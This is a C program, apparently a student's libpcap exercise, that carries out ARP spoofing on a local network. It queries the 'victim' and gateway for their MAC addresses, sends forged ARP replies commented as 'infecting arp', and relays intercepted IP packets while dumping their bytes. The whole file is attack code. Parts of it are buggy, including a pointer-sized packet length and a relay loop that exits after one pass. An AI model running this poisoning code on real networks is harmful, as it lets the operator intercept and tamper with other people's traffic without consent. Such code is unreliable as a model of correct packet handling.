#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include "packet.h"

int main(int argc, char* argv[]) {

    printf("%d\n", argc);
    if (argc < 4 || argc % 2 != 0) {
        //usage();
        printf("fail!!\n");
        return -1;
    }
    struct pcap_pkthdr *header;
        //header: time, length of packet
    const u_char* packet;

    char* dev = argv[1];

    //char* sender_ip = argv[2];
    //char* target_ip = argv[3];
    //char* my_ip= "192.168.243.149";
    struct in_addr iaddr;

    unsigned char buffer[100];
    char errbuf[PCAP_ERRBUF_SIZE];
    unsigned char buffer2[100];
    char errbuf2[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    //pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
    }



    struct E_header eh;
    struct IP_header ih;
    struct TCP_header th;
    struct arp_packet arp;
    struct arp_packet arp2;

        struct ifreq s;
        int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
        strcpy(s.ifr_name, dev);
        if(0!= ioctl(fd, SIOCGIFHWADDR, &s)){
            printf("ERROR: Cannot get local MAC addr\n");
            return -1;
        }
        strcpy(s.ifr_name, dev);
        memcpy(arp.source_mac, s.ifr_addr.sa_data, 6); //arp.source_mac = s.ifr_addr.sa_data 내 MAC주소
        memcpy(arp.target_hardware_addr, s.ifr_addr.sa_data, 6); //arp.sender_hardware_addr = arp.source_mac
        //inet_pton(AF_INET, s.ifr_name,  &iaddr.s_addr);
        //memcpy(my_ip, &iaddr.s_addr, 4);
        inet_pton(AF_INET, argv[2], &iaddr.s_addr); //arp.sender_ip_address = argv[2]의 IP주소
        memcpy(arp.sender_ip_address, &iaddr.s_addr, 4);
        inet_pton(AF_INET, argv[3], &iaddr.s_addr); //arp.target_ip_address = argv[3]의 주소
        memcpy(arp.target_ip_address, &iaddr.s_addr, 4);
        //close(fd);

        //여기에 피해자에게 맥주소 물어보는 코드 작성
        memset(buffer, 0x00, sizeof(buffer));
        memset(arp.destination_mac, 0xff, 6); //broadcasting
        arp.ether_type = htons(0x806);
        arp.hardware_type = htons(0x1);
        arp.protocol_type = htons(0x800);
        arp.hardware_len = 6;
        arp.protocol_len = 4;
        arp.operation = htons(0x1);
        //memcpy(arp.sender_ip_address, inet_ntoa(((struct sockaddr_in *)&s.ifr_addr)->sin_addr), 4);
        //inet_pton(AF_INET, argv[3], &iaddr.s_addr);
        //memcpy(arp.target_ip_address, &iaddr.s_addr, 4);
        memset(arp.sender_hardware_addr, 0, 6); //victim's mac address set 000000
        memcpy(buffer, &arp, sizeof(arp));
        //printf("%s", buffer);
        pcap_sendpacket(handle, buffer, sizeof(arp));


        while(true){
            //struct pcap_pkthdr *header;
            //header: time, length of packet
            //const u_char* packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;
            //ARP and operation is reply
            if(packet[12] == 8 && packet[13]==6 && packet[21]==2){
            if(0 == strncmp((char *)packet+28, (char *)arp.sender_ip_address, 4)){
                memcpy(arp.sender_hardware_addr, packet+22, 6);
                memcpy(arp.destination_mac, arp.sender_hardware_addr, 6);
                printf("successfully got victim's MAC address\n");
                break;
            }
            }
        }

        memset(buffer, 0, 100);
        memcpy(arp.source_mac, s.ifr_addr.sa_data, 6);
        arp.operation = htons(0x2);
        memcpy(arp.target_hardware_addr, arp.source_mac, 6);
        inet_pton(AF_INET, argv[3], &iaddr.s_addr); //arp.target_ip_address = argv[3]의 주소
        memcpy(arp.target_ip_address, &iaddr.s_addr, 4);
        inet_pton(AF_INET, argv[2], &iaddr.s_addr); //arp.target_ip_address = argv[3]의 주소
        memcpy(arp.sender_ip_address, &iaddr.s_addr, 4);

        //sender MAC 그대로, sender IP도 그대로 해도 됨 -> reply인것만 수정하면 됨
        memcpy(buffer, &arp, sizeof(arp));

        memcpy(arp2.source_mac, s.ifr_addr.sa_data, 6); //arp.source_mac = s.ifr_addr.sa_data 내 MAC주소
        memcpy(arp2.target_hardware_addr, s.ifr_addr.sa_data, 6); //arp.sender_hardware_addr = arp.source_mac
        //inet_pton(AF_INET, s.ifr_name,  &iaddr.s_addr);
        //memcpy(my_ip, &iaddr.s_addr, 4);
        inet_pton(AF_INET, argv[3], &iaddr.s_addr); //arp.sender_ip_address = argv[2]의 IP주소
        memcpy(arp2.sender_ip_address, &iaddr.s_addr, 4);
        inet_pton(AF_INET, argv[2], &iaddr.s_addr); //arp.target_ip_address = argv[3]의 주소
        memcpy(arp2.target_ip_address, &iaddr.s_addr, 4);

        //여기에 target에게 맥주소 물어보는 코드 작성
        memset(buffer2, 0x00, sizeof(buffer2));
        memset(arp2.destination_mac, 0xff, 6); //broadcasting
        memcpy(arp2.source_mac, arp.target_hardware_addr, 6);
        arp2.ether_type = htons(0x806);
        arp2.hardware_type = htons(0x1);
        arp2.protocol_type = htons(0x800);
        arp2.hardware_len = 6;
        arp2.protocol_len = 4;
        arp2.operation = htons(0x1);
        memset(arp2.sender_hardware_addr, 0, 6); //victim's mac address set 000000
        memcpy(arp2.target_hardware_addr, arp.target_hardware_addr, 6);
        //inet_pton(AF_INET, argv[3], &iaddr.s_addr); //arp.target_ip_address = argv[3]의 주소
        //memcpy(arp2.sender_ip_address, &iaddr.s_addr, 4);
        memcpy(arp2.target_ip_address, arp.sender_ip_address, 4);

        memcpy(buffer2, &arp2, sizeof(arp2));
        //printf("%s", buffer);

        pcap_sendpacket(handle, buffer2, sizeof(arp2)); //Gateway want knwo

        while(true){
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;
            printf("finding..\n");
            //ARP and operation is reply
            if(packet[12] == 8 && packet[13]==6 && packet[21]==2){
            if(0 == strncmp((char *)packet+28, (char *)arp2.sender_ip_address, 4)){
                memcpy(arp2.sender_hardware_addr, packet+22, 6);
                memcpy(arp2.destination_mac, arp2.sender_hardware_addr, 6);
                printf("successfully got gateway's MAC address\n");
                break;
            }
            }
        }

        //infecting arp
        pcap_sendpacket(handle, buffer, sizeof(arp));

        while (1){

            if(packet[12] == 8 && packet[13]==6 && packet[21]==1){
                pcap_sendpacket(handle, buffer, sizeof(arp));
            }

            pcap_next_ex(handle, &header, &packet);
            if(packet[12] == 8 && packet[13]==0){ //0x800이면 (IP)
                if(0 == strncmp((char *)packet+26, (char *)arp.sender_ip_address, 4)){ //sender IP Address와 같으면
                    memcpy((char *)packet, arp2.destination_mac, 6);
                    memcpy((char *)packet+6, arp.target_hardware_addr, 6);
                    //pcap_sendpacket(handle, packet, sizeof(packet));
                //inet_pton(AF_INET, my_ip, &iaddr.s_addr);
                //memcpy((char *)packet+6, packet+22, 6);
                //memcpy((char *)packet, arp2.destination_mac, 6);
                //memcpy((char *)packet, ) //srcIP to my IP
                //memcpy((char *)packet+26, (char *)arp2.sender_ip_address, 4); //source IP address
                    printf("\n");
                    for (int i = 0; header->caplen > i; i++) {
                        printf("%02x ", packet[i]);
                        if(i%15 ==0 )
                            printf("\n");
                    }
                    printf("\n");

                }
            }
            pcap_sendpacket(handle, packet, sizeof(packet));
            break;
        }


    pcap_close(handle);

  return 0;
}
